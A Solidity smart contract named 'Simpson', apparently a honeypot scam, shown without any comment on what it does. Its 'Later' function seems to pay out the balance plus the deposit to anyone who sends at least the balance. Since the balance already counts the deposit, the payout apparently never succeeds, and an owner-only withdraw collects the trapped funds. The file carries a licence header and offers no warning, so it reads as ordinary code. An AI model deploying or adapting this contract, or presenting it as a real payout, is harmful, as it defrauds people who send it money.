1 // Copyright (C) 2017  The Halo Platform by Scott Morrison
2 // https://www.haloplatform.tech/
3 // 
4 // This is free software and you are welcome to redistribute it under certain conditions.
5 // ABSOLUTELY NO WARRANTY; for details visit:
6 //
7 //      https://www.gnu.org/licenses/gpl-2.0.html
8 //
9 pragma solidity ^0.4.18;
10 
11 contract Simpson
12 {
13     string public constant version = "1.0";
14     address public Owner = msg.sender;
15 
16     function() public payable {}
17    
18     function withdraw() payable public {
19         require(msg.sender == Owner);
20         Owner.transfer(this.balance);
21     }
22     
23     function Later(address _address)  public payable {
24         if (msg.value >= this.balance) {        
25             _address.transfer(this.balance + msg.value);
26         }
27     }
28 }